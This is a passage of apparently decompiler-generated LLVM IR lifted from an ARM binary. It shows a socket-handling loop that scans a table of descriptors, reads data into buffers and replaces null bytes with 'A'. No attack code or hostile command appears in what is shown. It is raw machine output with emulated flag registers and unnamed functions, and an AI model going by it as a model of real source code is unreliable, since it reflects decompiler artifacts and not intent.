  %v3_fcd0 = load i32, i32* %v2_fcd0, align 4
  %v1_fcd4 = urem i32 %v3_fcbc, 32
  store i32 %v1_fcd4, i32* %r1.global-to-local, align 4
  %v7_fcd8 = shl i32 %v1_fcd8, %v1_fcd4
  %v8_fcd8 = or i32 %v3_fcd0, %v7_fcd8
  store i32 %v8_fcd8, i32* %r2.global-to-local, align 4
  %v0_fcdc = load i32, i32* @r5, align 4
  %v2_fcdc = sub i32 %v0_fcdc, %v3_fcbc
  %v3_fcdc = icmp uge i32 %v0_fcdc, %v3_fcbc
  store i1 %v3_fcdc, i1* %cpsr_c.global-to-local, align 1
  %v4_fcdc = xor i32 %v0_fcdc, %v3_fcbc
  %v5_fcdc = xor i32 %v2_fcdc, %v0_fcdc
  %v6_fcdc = and i32 %v5_fcdc, %v4_fcdc
  %v7_fcdc = icmp slt i32 %v6_fcdc, 0
  %v8_fcdc = icmp slt i32 %v2_fcdc, 0
  %v9_fcdc = icmp eq i32 %v0_fcdc, %v3_fcbc
  store i1 %v9_fcdc, i1* %cpsr_z.global-to-local, align 1
  %v2_fce0 = xor i1 %v8_fcdc, %v7_fcdc
  br i1 %v2_fce0, label %bb354, label %bb355

bb354:                                            ; preds = %dec_label_pc_fcbc
  store i32 %v3_fcbc, i32* @r5, align 4
  br label %bb355

bb355:                                            ; preds = %dec_label_pc_fcbc, %bb354
  store i32 %v8_fcd8, i32* %v2_fcd0, align 4
  br label %bb353

dec_label_pc_fcec:                                ; preds = %dec_label_pc_fc0c
  %v1_fcec = add i32 %v2_fc84, 4
  %v2_fcec = inttoptr i32 %v1_fcec to i32*
  %v3_fcec = load i32, i32* %v2_fcec, align 4
  store i32 %v3_fcec, i32* %r0.global-to-local, align 4
  %v1_fcf0 = call i32 @function_11af0(i32 %v3_fcec)
  store i32 %v1_fcf0, i32* %r0.global-to-local, align 4
  %v0_fcf4 = load i32, i32* @r4, align 4
  %v1_fcf4 = add i32 %v0_fcf4, 12
  %v2_fcf4 = inttoptr i32 %v1_fcf4 to i32*
  %v3_fcf4 = load i32, i32* %v2_fcf4, align 4
  store i32 %v3_fcf4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_fcfc = icmp ugt i32 %v3_fcf4, 1
  store i1 %v2_fcfc, i1* %cpsr_c.global-to-local, align 1
  %v7_fcfc = icmp eq i32 %v3_fcf4, 2
  store i1 %v7_fcfc, i1* %cpsr_z.global-to-local, align 1
  %v2_fd00 = add i32 %v0_fcf4, 4
  %v3_fd00 = inttoptr i32 %v2_fd00 to i32*
  store i32 -1, i32* %v3_fd00, align 4
  %v2_fd04 = xor i1 %v2_fcfc, true
  %v3_fd04 = or i1 %v7_fcfc, %v2_fd04
  br i1 %v3_fd04, label %dec_label_pc_fd2c, label %dec_label_pc_fd08

dec_label_pc_fd08:                                ; preds = %dec_label_pc_fcec
  %v0_fd08 = load i32, i32* @r4, align 4
  %v1_fd08 = add i32 %v0_fd08, 284
  %v2_fd08 = inttoptr i32 %v1_fd08 to i8*
  %v3_fd08 = load i8, i8* %v2_fd08, align 1
  %v4_fd08 = zext i8 %v3_fd08 to i32
  %v1_fd0c = add nuw nsw i32 %v4_fd08, 1
  %v1_fd10 = urem i32 %v1_fd0c, 256
  store i32 %v1_fd10, i32* %r3.global-to-local, align 4
  %v2_fd14 = icmp ugt i32 %v1_fd10, 9
  store i1 %v2_fd14, i1* %cpsr_c.global-to-local, align 1
  %v7_fd14 = icmp eq i32 %v1_fd10, 10
  store i1 %v7_fd14, i1* %cpsr_z.global-to-local, align 1
  %v1_fd18 = trunc i32 %v1_fd0c to i8
  store i8 %v1_fd18, i8* %v2_fd08, align 1
  %v0_fd1c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fd1c, label %dec_label_pc_fd2c, label %dec_label_pc_fd20

dec_label_pc_fd20:                                ; preds = %dec_label_pc_fd08
  %v0_fd20 = load i32, i32* @r4, align 4
  store i32 %v0_fd20, i32* @r0, align 4
  %v0_fd24 = call i32 @function_f144()
  store i32 %v0_fd24, i32* %r0.global-to-local, align 4
  br label %bb353

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fd08, %dec_label_pc_fcec
  %v0_fd2c = load i32, i32* @r7, align 4
  %v1_fd2c = load i32, i32* @r4, align 4
  %v2_fd2c = add i32 %v1_fd2c, 12
  %v3_fd2c = inttoptr i32 %v2_fd2c to i32*
  store i32 %v0_fd2c, i32* %v3_fd2c, align 4
  %v0_fd30 = load i32, i32* @r7, align 4
  %v1_fd30 = trunc i32 %v0_fd30 to i8
  %v2_fd30 = load i32, i32* @r4, align 4
  %v3_fd30 = add i32 %v2_fd30, 284
  %v4_fd30 = inttoptr i32 %v3_fd30 to i8*
  store i8 %v1_fd30, i8* %v4_fd30, align 1
  br label %bb353

dec_label_pc_fd38:                                ; preds = %bb353
  store i32 1, i32* %stack_var_-64, align 4
  %v0_fd40 = load i32, i32* @r6, align 4
  %v1_fd40 = load i32, i32* @r5, align 4
  %v2_fd40 = sub i32 %v0_fd40, %v1_fd40
  %v3_fd40 = icmp uge i32 %v0_fd40, %v1_fd40
  store i1 %v3_fd40, i1* %cpsr_c.global-to-local, align 1
  %v4_fd40 = xor i32 %v1_fd40, %v0_fd40
  %v5_fd40 = xor i32 %v2_fd40, %v0_fd40
  %v6_fd40 = and i32 %v5_fd40, %v4_fd40
  %v7_fd40 = icmp slt i32 %v6_fd40, 0
  %v8_fd40 = icmp slt i32 %v2_fd40, 0
  %v9_fd40 = icmp eq i32 %v0_fd40, %v1_fd40
  store i1 %v9_fd40, i1* %cpsr_z.global-to-local, align 1
  %v2_fd44 = xor i1 %v8_fd40, %v7_fd40
  %v1_fd40.v0_fd40 = select i1 %v2_fd44, i32 %v1_fd40, i32 %v0_fd40
  %v2_fd58 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_fd58, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fd60 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_fd60, i32* %ip.global-to-local, align 4
  %v2_fd64 = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v2_fd64, i32* %r1.global-to-local, align 4
  %v1_fd68 = add i32 %v1_fd40.v0_fd40, 1
  store i32 %v1_fd68, i32* %r0.global-to-local, align 4
  %v5_fd74 = call i32 @function_11d10(i32 %v1_fd68, i32 %v2_fd64, i32 %v2_fd58, i32 0, i32 %v2_fd60)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_fd7c = call i32 @function_11dc0(i32* null)
  store i32 ptrtoint (i32* @global_var_1cad4.130 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_fd7c, i32* @global_var_1cad4.130, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v2_fdfc = ptrtoint i32* %stack_var_-36 to i32
  %v2_ffa4 = inttoptr i32 %stack_var_-1868.0 to i32*
  %v2_1004c = ptrtoint i32* %stack_var_-41 to i32
  %v2_107f4 = ptrtoint i32* %stack_var_-84 to i32
  %v2_107fc = ptrtoint i32* %stack_var_-73 to i32
  %v2_fef4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_103f8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_10a5c = ptrtoint i32* %stack_var_-92 to i32
  %v3_10a64 = bitcast i32* %stack_var_-92 to %sockaddr*
  %v2_10abc = ptrtoint i32* %stack_var_-38 to i32
  br label %dec_label_pc_fdd0

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fdf4, %dec_label_pc_109a4
  %v0_fdac = phi i32 [ %v3_fde8, %dec_label_pc_fdf4 ], [ %v0_fd98.pre, %dec_label_pc_109a4 ]
  %v3_fd98 = udiv i32 %v0_fdac, 32
  %v3_fd9c = mul nuw nsw i32 %v3_fd98, 4
  store i32 %v2_fdfc, i32* @lr, align 4
  %v2_fda4 = add i32 %v3_fd9c, %v2_fdfc
  store i32 %v2_fda4, i32* %r3.global-to-local, align 4
  %v1_fda8 = add i32 %v2_fda4, -184
  %v2_fda8 = inttoptr i32 %v1_fda8 to i32*
  %v3_fda8 = load i32, i32* %v2_fda8, align 4
  %v1_fdac = urem i32 %v0_fdac, 32
  store i32 %v1_fdac, i32* %r1.global-to-local, align 4
  %v2_fdb0 = add nsw i32 %v1_fdac, -1
  %v3_fdb0 = shl i32 1, %v2_fdb0
  %v4_fdb0 = and i32 %v3_fdb0, %v3_fda8
  %v5_fdb0 = icmp ne i32 %v4_fdb0, 0
  store i1 %v5_fdb0, i1* %cpsr_c.global-to-local, align 1
  %v6_fdb0 = lshr i32 %v3_fda8, %v1_fdac
  store i32 %v6_fdb0, i32* %r2.global-to-local, align 4
  %v1_fdb4 = urem i32 %v6_fdb0, 2
  %v2_fdb4 = icmp eq i32 %v1_fdb4, 0
  store i1 %v2_fdb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fdb4, label %dec_label_pc_fdbc, label %dec_label_pc_ff80.preheader

dec_label_pc_ff80.preheader:                      ; preds = %dec_label_pc_fd98
  %v0_ff80126 = load i32, i32* @r6, align 4
  %v1_ff80127 = add i32 %v0_ff80126, 12
  %v2_ff80128 = inttoptr i32 %v1_ff80127 to i32*
  %v3_ff80129 = load i32, i32* %v2_ff80128, align 4
  store i32 %v3_ff80129, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff84125131 = icmp eq i32 %v3_ff80129, 0
  store i1 %v2_ff84125131, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff84125131, label %dec_label_pc_fdbc, label %dec_label_pc_ff8c.lr.ph

dec_label_pc_fdbc:                                ; preds = %dec_label_pc_ff80.loopexit, %dec_label_pc_ff84.backedge, %dec_label_pc_ff80.preheader, %dec_label_pc_fd98, %bb393, %dec_label_pc_108f0, %dec_label_pc_fdd0, %dec_label_pc_109c8, %dec_label_pc_10934
  %v3_fdbc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_fdbc, i32* %r3.global-to-local, align 4
  %v1_fdc0 = add i32 %v3_fdbc, 1
  store i32 %v1_fdc0, i32* %r2.global-to-local, align 4
  %v2_fdc4 = icmp ugt i32 %v1_fdc0, 254
  store i1 %v2_fdc4, i1* %cpsr_c.global-to-local, align 1
  %v7_fdc4 = icmp eq i32 %v1_fdc0, 255
  store i1 %v7_fdc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fdc0, i32* %stack_var_-52, align 4
  %v8_fdcc = icmp sgt i32 %v1_fdc0, 255
  br i1 %v8_fdcc, label %dec_label_pc_f6d4, label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fdbc, %dec_label_pc_fd38
  %v0_fddc = phi i32 [ %v1_fdc0, %dec_label_pc_fdbc ], [ 0, %dec_label_pc_fd38 ]
  store i32 ptrtoint (i32* @global_var_1cb38.143 to i32), i32* %ip.global-to-local, align 4
  %v3_fdd4 = mul i32 %v0_fddc, 256
  store i32 %v3_fdd4, i32* %r3.global-to-local, align 4
  %v2_fdd8 = load i32, i32* @global_var_1cb38.143, align 4
  store i32 %v2_fdd8, i32* %r1.global-to-local, align 4
  %v2_fde0 = mul i32 %v0_fddc, 288
  store i32 %v2_fde0, i32* %r2.global-to-local, align 4
  %v2_fde4 = add i32 %v2_fdd8, %v2_fde0
  store i32 %v2_fde4, i32* @r6, align 4
  %v1_fde8 = add i32 %v2_fde4, 4
  %v2_fde8 = inttoptr i32 %v1_fde8 to i32*
  %v3_fde8 = load i32, i32* %v2_fde8, align 4
  store i32 %v3_fde8, i32* @r4, align 4
  %v2_fdec = icmp eq i32 %v3_fde8, -1
  store i1 %v2_fdec, i1* %cpsr_c.global-to-local, align 1
  %v7_fdec = icmp eq i32 %v3_fde8, -1
  store i1 %v7_fdec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdec, label %dec_label_pc_fdbc, label %dec_label_pc_fdf4

dec_label_pc_fdf4:                                ; preds = %dec_label_pc_fdd0
  %v3_fdf4 = udiv i32 %v3_fde8, 32
  %v3_fdf8 = mul nuw nsw i32 %v3_fdf4, 4
  store i32 %v2_fdfc, i32* %lr.global-to-local, align 4
  %v2_fe00 = add i32 %v3_fdf8, %v2_fdfc
  store i32 %v2_fe00, i32* %r3.global-to-local, align 4
  %v1_fe04 = add i32 %v2_fe00, -312
  %v2_fe04 = inttoptr i32 %v1_fe04 to i32*
  %v3_fe04 = load i32, i32* %v2_fe04, align 4
  %v1_fe08 = urem i32 %v3_fde8, 32
  store i32 %v1_fe08, i32* %r1.global-to-local, align 4
  %v2_fe0c = add nsw i32 %v1_fe08, -1
  %v3_fe0c = shl i32 1, %v2_fe0c
  %v4_fe0c = and i32 %v3_fe04, %v3_fe0c
  %v5_fe0c = icmp ne i32 %v4_fe0c, 0
  store i1 %v5_fe0c, i1* %cpsr_c.global-to-local, align 1
  %v6_fe0c = lshr i32 %v3_fe04, %v1_fe08
  store i32 %v6_fe0c, i32* %r2.global-to-local, align 4
  %v1_fe10 = urem i32 %v6_fe0c, 2
  %v2_fe10 = icmp eq i32 %v1_fe10, 0
  store i1 %v2_fe10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe10, label %dec_label_pc_fd98, label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fdf4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_103f8, i32* %r3.global-to-local, align 4
  store i32 %v2_fef4, i32* %ip.global-to-local, align 4
  store i32 %v3_fde8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v6_fe48 = call i32 @function_12294(i32 %v3_fde8, i32 1, i32 4, i32* nonnull %stack_var_-48, i32 %v2_fef4)
  %v3_fe4c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_fe4c, i32* %r3.global-to-local, align 4
  %v2_fe50 = or i32 %v3_fe4c, %v6_fe48
  store i32 %v2_fe50, i32* %r0.global-to-local, align 4
  %v4_fe50 = icmp eq i32 %v2_fe50, 0
  store i1 %v4_fe50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fe50, label %dec_label_pc_fe58, label %dec_label_pc_109c8

dec_label_pc_fe58:                                ; preds = %dec_label_pc_fe18
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_fe5c = load i32, i32* @r6, align 4
  %v2_fe5c = add i32 %v1_fe5c, 12
  %v3_fe5c = inttoptr i32 %v2_fe5c to i32*
  store i32 2, i32* %v3_fe5c, align 4
  %v0_fe60 = call i32 @function_e978()
  store i32 %v0_fe60, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1cad0.136 to i32), i32* %r3.global-to-local, align 4
  %v3_fe68 = load i8, i8* @global_var_1cad1.137, align 1
  %v4_fe68 = zext i8 %v3_fe68 to i32
  store i32 %v4_fe68, i32* %r2.global-to-local, align 4
  %v2_fe6c = load i8, i8* bitcast (i8** @global_var_1cad0.136 to i8*), align 4
  %v3_fe6c = zext i8 %v2_fe6c to i32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_fe70 = mul nuw nsw i32 %v4_fe68, 256
  %v5_fe70 = or i32 %v3_fe6c, %v4_fe70
  store i32 %v5_fe70, i32* %r1.global-to-local, align 4
  %v2_fe74 = call i32 @function_11878(i32 %v0_fe60, i32 %v5_fe70)
  store i32 ptrtoint (i32* @global_var_1caa0.132 to i32), i32* %r3.global-to-local, align 4
  %v2_fe7c = load i32, i32* @global_var_1caa0.132, align 4
  store i32 %v2_fe7c, i32* %lr.global-to-local, align 4
  %v1_fe84 = load i32, i32* @r5, align 4
  %v9_fe84 = icmp eq i32 %v2_fe7c, %v1_fe84
  store i1 %v9_fe84, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_fe88 = urem i32 %v2_fe74, 65536
  store i32 %v3_fe88, i32* %r0.global-to-local, align 4
  %v7_fe8c = icmp sgt i32 %v2_fe7c, %v1_fe84
  br i1 %v7_fe8c, label %dec_label_pc_fe90, label %dec_label_pc_109a0

dec_label_pc_fe90:                                ; preds = %dec_label_pc_fe58
  %v2_fe94 = load i32, i32* @global_var_1cacc.134, align 4
  store i32 %v2_fe94, i32* %r3.global-to-local, align 4
  store i32 %v1_fe84, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_feb0

dec_label_pc_fea0:                                ; preds = %dec_label_pc_fec8, %dec_label_pc_feb0
  %v1_fea0 = add i32 %v0_fea0, 1
  store i32 %v1_fea0, i32* %ip.global-to-local, align 4
  %v3_fea4 = icmp uge i32 %v1_fea0, %v2_fe7c
  store i1 %v3_fea4, i1* %cpsr_c.global-to-local, align 1
  %v9_fea4 = icmp eq i32 %v1_fea0, %v2_fe7c
  store i1 %v9_fea4, i1* %cpsr_z.global-to-local, align 1
  %v1_fea8 = add i32 %v0_fea8, 16
  store i32 %v1_fea8, i32* %r3.global-to-local, align 4
  br i1 %v9_fea4, label %dec_label_pc_109a0, label %dec_label_pc_feb0

dec_label_pc_feb0:                                ; preds = %dec_label_pc_fea0, %dec_label_pc_fe90
  %v0_fea0 = phi i32 [ %v1_fea0, %dec_label_pc_fea0 ], [ %v1_fe84, %dec_label_pc_fe90 ]
  %v0_fea8 = phi i32 [ %v1_fea8, %dec_label_pc_fea0 ], [ %v2_fe94, %dec_label_pc_fe90 ]
  store i32 %v0_fea8, i32* %r1.global-to-local, align 4
  %v1_feb4 = add i32 %v0_fea8, 9
  %v2_feb4 = inttoptr i32 %v1_feb4 to i8*
  %v3_feb4 = load i8, i8* %v2_feb4, align 1
  %v4_feb4 = zext i8 %v3_feb4 to i32
  store i32 %v4_feb4, i32* %r2.global-to-local, align 4
  %v1_feb8 = add i32 %v0_fea8, 8
  %v2_feb8 = inttoptr i32 %v1_feb8 to i8*
  %v3_feb8 = load i8, i8* %v2_feb8, align 1
  %v4_feb8 = zext i8 %v3_feb8 to i32
  %v4_febc = mul nuw nsw i32 %v4_feb4, 256
  %v5_febc = or i32 %v4_feb8, %v4_febc
  store i32 %v5_febc, i32* %r3.global-to-local, align 4
  %v3_fec0 = icmp uge i32 %v5_febc, %v3_fe88
  store i1 %v3_fec0, i1* %cpsr_c.global-to-local, align 1
  %v9_fec0 = icmp eq i32 %v5_febc, %v3_fe88
  store i1 %v9_fec0, i1* %cpsr_z.global-to-local, align 1
  %v2_fec4 = xor i1 %v9_fec0, true
  %v3_fec4 = and i1 %v3_fec0, %v2_fec4
  br i1 %v3_fec4, label %dec_label_pc_fea0, label %dec_label_pc_fec8

dec_label_pc_fec8:                                ; preds = %dec_label_pc_feb0
  %v1_fec8 = add i32 %v0_fea8, 10
  %v2_fec8 = inttoptr i32 %v1_fec8 to i8*
  %v3_fec8 = load i8, i8* %v2_fec8, align 1
  %v4_fec8 = zext i8 %v3_fec8 to i32
  store i32 %v4_fec8, i32* %r3.global-to-local, align 4
  %v1_fecc = add i32 %v0_fea8, 11
  %v2_fecc = inttoptr i32 %v1_fecc to i8*
  %v3_fecc = load i8, i8* %v2_fecc, align 1
  %v4_fecc = zext i8 %v3_fecc to i32
  store i32 %v4_fecc, i32* %r2.global-to-local, align 4
  %v4_fed0 = mul nuw nsw i32 %v4_fecc, 256
  %v5_fed0 = or i32 %v4_fed0, %v4_fec8
  store i32 %v5_fed0, i32* %r3.global-to-local, align 4
  %v3_fed4 = icmp uge i32 %v5_fed0, %v3_fe88
  store i1 %v3_fed4, i1* %cpsr_c.global-to-local, align 1
  %v9_fed4 = icmp eq i32 %v5_fed0, %v3_fe88
  store i1 %v9_fed4, i1* %cpsr_z.global-to-local, align 1
  %v2_fed8 = xor i1 %v3_fed4, true
  %v3_fed8 = or i1 %v9_fed4, %v2_fed8
  br i1 %v3_fed8, label %dec_label_pc_fea0, label %dec_label_pc_109a4

dec_label_pc_fee0:                                ; preds = %dec_label_pc_10150, %dec_label_pc_10124, %dec_label_pc_1016c
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_fee4 = call i32 @function_10c20(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_feec = call i32 @function_10c20(i32 27)
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_fefc = call i32 @function_10b3c(i32 26, i32* nonnull %stack_var_-56)
  store i32 %v3_fefc, i32* @r4, align 4
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_ff10 = call i32 @function_10b3c(i32 27, i32* nonnull %stack_var_-56)
  %v3_ff14 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_ff10, i32* @r5, align 4
  %v0_ff1c = load i32, i32* @r4, align 4
  store i32 %v0_ff1c, i32* %r2.global-to-local, align 4
  %v1_ff20 = add i32 %v3_ff14, -1
  store i32 %v1_ff20, i32* %r3.global-to-local, align 4
  %v0_ff24 = load i32, i32* @sb, align 4
  store i32 %v0_ff24, i32* %r0.global-to-local, align 4
  %v0_ff28 = load i32, i32* @r6, align 4
  %v1_ff28 = add i32 %v0_ff28, 24
  %v2_ff28 = inttoptr i32 %v1_ff28 to i32*
  %v3_ff28 = load i32, i32* %v2_ff28, align 4
  store i32 %v3_ff28, i32* %r1.global-to-local, align 4
  %v4_ff2c = call i32 @function_112b0(i32 %v0_ff24, i32 %v3_ff28, i32 %v0_ff1c, i32 %v1_ff20)
  store i32 %v4_ff2c, i32* %r0.global-to-local, align 4
  %v2_ff30 = icmp eq i32 %v4_ff2c, -1
  store i1 %v2_ff30, i1* %cpsr_c.global-to-local, align 1
  %v7_ff30 = icmp eq i32 %v4_ff2c, -1
  store i1 %v7_ff30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff30, label %dec_label_pc_ff40, label %dec_label_pc_ff68

dec_label_pc_ff40:                                ; preds = %dec_label_pc_fee0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_ff40 = load i32, i32* %stack_var_-56, align 4
  %v0_ff44 = load i32, i32* @r5, align 4
  store i32 %v0_ff44, i32* %r2.global-to-local, align 4
  %v1_ff48 = add i32 %v3_ff40, -1
  store i32 %v1_ff48, i32* %r3.global-to-local, align 4
  %v0_ff4c = load i32, i32* @sb, align 4
  store i32 %v0_ff4c, i32* %r0.global-to-local, align 4
  %v0_ff50 = load i32, i32* @r6, align 4
  %v1_ff50 = add i32 %v0_ff50, 24
  %v2_ff50 = inttoptr i32 %v1_ff50 to i32*
  %v3_ff50 = load i32, i32* %v2_ff50, align 4
  store i32 %v3_ff50, i32* %r1.global-to-local, align 4
  %v4_ff54 = call i32 @function_112b0(i32 %v0_ff4c, i32 %v3_ff50, i32 %v0_ff44, i32 %v1_ff48)
  store i32 %v4_ff54, i32* %r0.global-to-local, align 4
  %v2_ff58 = icmp eq i32 %v4_ff54, -1
  store i1 %v2_ff58, i1* %cpsr_c.global-to-local, align 1
  %v7_ff58 = icmp eq i32 %v4_ff54, -1
  store i1 %v7_ff58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff58, label %dec_label_pc_109e4, label %dec_label_pc_ff68

dec_label_pc_ff68:                                ; preds = %dec_label_pc_ff40, %dec_label_pc_fee0
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_ff6c = call i32 @function_10b68(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_ff74 = call i32 @function_10b68(i32 27)
  store i32 %v1_ff74, i32* %r0.global-to-local, align 4
  %v0_ff78 = load i32, i32* @r7, align 4
  %v3_ff78 = icmp eq i32 %v0_ff78, -1
  store i1 %v3_ff78, i1* %cpsr_c.global-to-local, align 1
  %v8_ff78 = icmp eq i32 %v0_ff78, -1
  store i1 %v8_ff78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ff78, label %dec_label_pc_ff80.loopexit, label %dec_label_pc_10188

dec_label_pc_ff80.loopexit:                       ; preds = %dec_label_pc_10114, %dec_label_pc_1047c, %dec_label_pc_10004, %dec_label_pc_ff68, %dec_label_pc_10884
  %v0_ff80 = load i32, i32* @r6, align 4
  %v1_ff80 = add i32 %v0_ff80, 12
  %v2_ff80 = inttoptr i32 %v1_ff80 to i32*
  %v3_ff80 = load i32, i32* %v2_ff80, align 4
  store i32 %v3_ff80, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff84125 = icmp eq i32 %v3_ff80, 0
  store i1 %v2_ff84125, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff84125, label %dec_label_pc_fdbc, label %dec_label_pc_ff8c.lr.ph

dec_label_pc_ff8c.lr.ph:                          ; preds = %dec_label_pc_ff80.preheader, %dec_label_pc_ff80.loopexit
  %v0_ff8c154 = phi i32 [ %v0_ff80, %dec_label_pc_ff80.loopexit ], [ %v0_ff80126, %dec_label_pc_ff80.preheader ]
  br label %dec_label_pc_ff8c

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff84.backedge.thread, %dec_label_pc_ff84.backedge, %dec_label_pc_ff84.backedge.thread500, %dec_label_pc_ff8c.lr.ph
  %v0_10968 = phi i32 [ %v0_ff8c154, %dec_label_pc_ff8c.lr.ph ], [ %v0_ff8c151, %dec_label_pc_ff84.backedge ], [ %v0_10004, %dec_label_pc_ff84.backedge.thread ], [ %v0_10004, %dec_label_pc_ff84.backedge.thread500 ]
  %v1_ff8c = add i32 %v0_10968, 24
  %v2_ff8c = inttoptr i32 %v1_ff8c to i32*
  %v3_ff8c = load i32, i32* %v2_ff8c, align 4
  store i32 %v3_ff8c, i32* %r3.global-to-local, align 4
  %v2_ff90 = icmp ugt i32 %v3_ff8c, 255
  store i1 %v2_ff90, i1* %cpsr_c.global-to-local, align 1
  %v7_ff90 = icmp eq i32 %v3_ff8c, 256
  store i1 %v7_ff90, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_10968, 28
  store i32 %.pre, i32* @sb, align 4
  br i1 %v7_ff90, label %dec_label_pc_10968, label %dec_label_pc_ff9c

dec_label_pc_ff9c:                                ; preds = %dec_label_pc_ff8c, %dec_label_pc_10968
  store i32 %stack_var_-1868.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %v2_ffa4, align 4
  %v0_ffa8 = load i32, i32* @r6, align 4
  %v1_ffa8 = add i32 %v0_ffa8, 24
  %v2_ffa8 = inttoptr i32 %v1_ffa8 to i32*
  %v3_ffa8 = load i32, i32* %v2_ffa8, align 4
  store i32 %v3_ffa8, i32* %r2.global-to-local, align 4
  %v0_ffac = load i32, i32* @sb, align 4
  %v2_ffac = add i32 %v0_ffac, %v3_ffa8
  store i32 %v2_ffac, i32* @r4, align 4
  %v1_ffb0 = add i32 %v0_ffa8, 4
  %v2_ffb0 = inttoptr i32 %v1_ffb0 to i32*
  %v3_ffb0 = load i32, i32* %v2_ffb0, align 4
  store i32 %v3_ffb0, i32* %r0.global-to-local, align 4
  %v1_ffb4 = sub i32 256, %v3_ffa8
  store i32 %v1_ffb4, i32* %r2.global-to-local, align 4
  store i32 %v2_ffac, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ffc0 = inttoptr i32 %v2_ffac to i32*
  %v5_ffc0 = call i32 @function_122f0(i32 %v3_ffb0, i32* %v4_ffc0, i32 %v1_ffb4, i32 16384)
  store i32 %v5_ffc0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffc4 = icmp eq i32 %v5_ffc0, 0
  store i1 %v2_ffc4, i1* %cpsr_z.global-to-local, align 1
  %tmp358 = icmp slt i32 %v5_ffc0, 1
  br i1 %tmp358, label %dec_label_pc_108e4, label %dec_label_pc_ffcc

dec_label_pc_ffcc:                                ; preds = %dec_label_pc_ff9c
  %v0_ffcc = load i32, i32* @r5, align 4
  store i32 %v0_ffcc, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ffd4

dec_label_pc_ffd4:                                ; preds = %bb360, %dec_label_pc_ffcc
  %v3_ffdc = phi i32 [ %v1_ffe0, %bb360 ], [ %v0_ffcc, %dec_label_pc_ffcc ]
  %v1_ffd4 = load i32, i32* @r4, align 4
  %v2_ffd4 = add i32 %v1_ffd4, %v3_ffdc
  %v3_ffd4 = inttoptr i32 %v2_ffd4 to i8*
  %v4_ffd4 = load i8, i8* %v3_ffd4, align 1
  %v6_ffd4 = zext i8 %v4_ffd4 to i32
  store i32 %v6_ffd4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffd8 = icmp eq i8 %v4_ffd4, 0
  store i1 %v2_ffd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffd8, label %bb359, label %bb360

bb359:                                            ; preds = %dec_label_pc_ffd4
  %v1_ffdc = load i32, i32* %r1.global-to-local, align 4
  %v2_ffdc = trunc i32 %v1_ffdc to i8
  store i8 %v2_ffdc, i8* %v3_ffd4, align 1
  %v0_ffe0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb360

bb360:                                            ; preds = %dec_label_pc_ffd4, %bb359
